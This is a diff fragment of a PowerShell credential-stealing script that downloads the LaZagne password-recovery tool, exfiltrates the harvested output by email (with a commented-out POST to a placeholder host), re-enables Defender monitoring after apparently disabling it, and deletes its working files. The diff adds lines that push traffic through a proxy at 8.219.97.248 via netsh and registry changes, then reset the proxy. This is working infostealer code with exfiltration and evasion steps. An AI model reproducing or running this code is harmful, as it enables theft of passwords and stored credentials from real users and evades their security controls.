@@ -97,7 +97,8 @@ Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download
 # Exfiltrate the file
 #POST REQUEST
 #Invoke-WebRequest -Uri "http://IP:PORT0" -Method POST -Body Get-Content "$dir\output.txt"
-
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name AutoDetect -Value 1
+netsh winhttp set proxy 8.219.97.248:80 bypass-list="localhost"
 # Mail Exfiltration
 $EmailFrom = "HerbertSwindel@outlook.com"
 $EmailTo = "herbertswindel@gmail.com"
@@ -121,6 +122,7 @@ try {
     Write-Host "Failed to send email. Error: $($_.Exception.Message)"
 }
 
+netsh winhttp reset proxy
 # Clean up
 Remove-Item -Path $dir -Recurse -Force
 Set-MpPreference -DisableRealtimeMonitoring $false
